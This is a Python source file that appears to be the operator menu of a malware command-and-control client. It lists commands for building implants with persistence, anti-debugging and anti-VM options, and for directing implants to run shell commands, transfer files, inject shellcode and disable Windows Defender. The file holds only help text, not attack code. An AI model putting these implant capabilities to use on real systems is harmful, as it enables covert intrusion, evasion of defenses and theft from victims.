COMMANDS = {
    "help": "Show this help message and exit",
    "show": {
        "implants": "Show all implants",
        "tasks": "Show all active tasks",
        "stats": "Show basic statistics about the server and clients",
    },
    "builder": {
        "set": {
            "initial_sleep_seconds <seconds>": "Set the initial sleep time",
            "schtask_persist <true|false>": "Set the schtask_persist option",
            "use_antidebug <true|false>": "Set the use_antidebug option",
            "kill_parent <true|false>": "Set the kill_parent option",
            "use_antivm <true|false>": "Set the use_antivm option",
            "scheduled_task_name <name>": "Set the scheduled task name",
            "register_max_retries <number>": "Set the max number of retries for registering",
        },
        "show": {
            "all": "Show all builder options",
            "initial_sleep_seconds": "Show the initial sleep time",
            "schtask_persist": "Show the schtask_persist option",
            "use_antidebug": "Show the use_antidebug option",
            "kill_parent": "Show the kill_parent option",
            "use_antivm": "Show the use_antivm option",
            "scheduled_task_name": "Show the scheduled task name",
            "register_max_retries": "Show the max number of retries for registering",
        },
    },
    "broadcast <command>": "Send an interact command to every connected implant (this can get very noisy, USE WITH CAUTION!)",
    "build <output_file>": "Build an implant with the given options and write it to <output_file>",
    "interact <implant_id>": "Interact with a given implant id",
    "results <task_id> [local_path]": "Show the results of a given task id. Optionally write the results to a file",
    "exit": "Exit the client",
}

INTERACT_COMMANDS = {
    "cmd <args>": "Execute a shell command on the implant",
    "download <remote_path>": "Download a file from the implant",
    "disable_defender": "Try to disable Windows Defender (will not work if user is not admin)",
    "upload <local_path> <remote_path>": "Upload a file to the implant and store it in <remote_path>",
    "inject <shellcode_path> <process_name>": "Spawn a process then inject shellcode into it",
    "sysinfo": "Get system information from the implant",
    "sleep <seconds>": "Sleep for a given number of seconds",
    "selfdestruct": "Remove and kill the implant",
    "chdir <path>": "Change the implant's working directory",
    "pwd": "Get the implant's working directory",
    "getenv": "Get all environment variables",
    "ls": "List files in the implant's working directory",
    "ps": "List running processes",
    "whoami": "Get the current user",
    "config": {
        "set": {
            "user_agent <user_agent>": "Set the user agent for the implant",
            "sleep_time <seconds>": "Set the sleep time for the implant",
            "kill_date <YYYY-MM-DD>": "Set the kill date for the implant",
            "jitter <percent>": "Set the jitter for the implant",
            "max_retries <number>": "Set the max retries for the implant",
            "auto_self_destruct <True|False>": "Set the auto self destruct for the implant",
            "retry_wait <seconds>": "Set the retry wait for the implant",
            "retry_jitter <percent>": "Set the retry jitter for the implant",
            "tailoring_hash_function (sha256|md5)": "Set the hash function for payload tailoring",
            "tailoring_hash_rounds <number>": "Set the number of rounds for payload tailoring",
        },
        "show": {
            "all": "Show all configuration options",
            "user_agent": "Show the user agent for the implant",
            "sleep_time": "Show the sleep time for the implant",
            "kill_date": "Show the kill date for the implant",
            "jitter": "Show the jitter for the implant",
            "max_retries": "Show the max retries for the implant",
            "auto_self_destruct": "Show the auto self destruct for the implant",
            "retry_wait": "Show the retry wait for the implant",
            "retry_jitter": "Show the retry jitter for the implant",
            "tailoring_hash_function": "Show the hash function for payload tailoring",
            "tailoring_hash_rounds": "Show the number of rounds for payload tailoring",
        },
    },
    "results <task_id> [local_path]": "Show the results of a given task id. Optionally write the results to a file",
    "back": "Exit the interact menu",
    "exit": "Exit the interact menu",
}


def walk_dict(d, depth=0):
    for k, v in sorted(d.items(), key=lambda x: x[0]):
        if isinstance(v, dict):
            print("  " * depth + ("- %s" % k))
            walk_dict(v, depth + 1)
        else:
            print("  " * depth + "- %s: %s" % (k, v))
